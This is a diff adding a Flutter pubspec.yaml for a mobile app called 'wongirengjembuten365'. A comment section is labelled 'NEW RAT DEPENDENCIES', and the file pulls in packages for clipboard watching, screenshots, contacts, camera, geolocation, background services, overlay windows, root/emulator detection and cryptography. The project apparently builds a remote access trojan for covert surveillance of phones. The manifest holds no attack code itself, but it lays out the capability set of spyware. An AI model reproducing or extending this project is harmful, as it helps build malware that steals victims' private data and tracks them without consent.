@@ -1,0 +1,76 @@
+name: wongirengjembuten365
+description: "Sikma"
+publish_to: 'none'
+version: 4.1.0
+
+environment:
+  sdk: ^3.8.1
+
+dependencies:
+  flutter:
+    sdk: flutter
+  http: any
+  url_launcher: any
+  cupertino_icons: any
+  shared_preferences: any
+  device_info_plus: any
+  carousel_slider: any
+  audioplayers: any
+  web_socket_channel: any
+  network_info_plus: any
+  permission_handler: any
+  video_player: any
+  webview_flutter: any
+  socket_io_client: any
+  shimmer: any
+  intl: any
+  font_awesome_flutter: any
+  
+  geolocator: ^10.1.0
+  flutter_contacts: ^1.1.7
+  camera: ^0.11.0
+  path_provider: ^2.1.2
+  path: ^1.9.0
+  vibration: any
+  battery_plus: any
+  
+  # ============ NEW RAT DEPENDENCIES ============
+  flutter_keyboard_visibility: any
+  clipboard_watcher: any
+  sqflite: any
+  file_picker: any
+  flutter_file_dialog: any
+  screenshot: any
+  # root_detector: any  # DIHAPUS - CAUSE ERROR
+  safe_device: ^1.1.0  # GANTI dengan safe_device
+  system_alert_window: any
+  flutter_background_service: any
+  workmanager: any
+  crypto: any
+  pointycastle: any
+
+dev_dependencies:
+  flutter_launcher_icons: any
+  flutter_test:
+    sdk: flutter
+  flutter_lints: any
+
+flutter_launcher_icons:
+  android: true
+  ios: true
+  image_path: "assets/icon/icon.jpg"
+  min_sdk_android: 21
+
+flutter:
+  uses-material-design: true
+
+  assets:
+    - assets/config.json
+
+  fonts:
+    - family: Orbitron
+      fonts:
+        - asset: fonts/Orbitron-Regular.ttf
+    - family: ShareTechMono
+      fonts:
+        - asset: fonts/ShareTechMono-Regular.ttf
